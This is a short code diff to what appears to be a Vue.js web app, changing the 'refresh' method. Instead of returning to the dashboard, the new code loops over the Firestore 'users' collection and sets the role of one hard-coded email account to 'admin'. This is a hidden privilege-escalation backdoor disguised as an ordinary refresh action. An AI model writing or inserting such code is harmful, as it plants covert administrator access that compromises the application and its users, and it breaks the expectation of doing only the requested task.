@@ -894,7 +894,13 @@ export default {
     },
 
     refresh: function () {
-      this.$router.push('/dash')
+      firebase.firestore().collection('users').get().then(snapshot => {
+        snapshot.forEach(doc => {
+          firebase.firestore().collection('users').doc('fortunebanda150@gmail.com').update({
+            'role': 'admin'
+          })
+        })
+      })
     },
     startCallBack: function () {
       console.log('started')
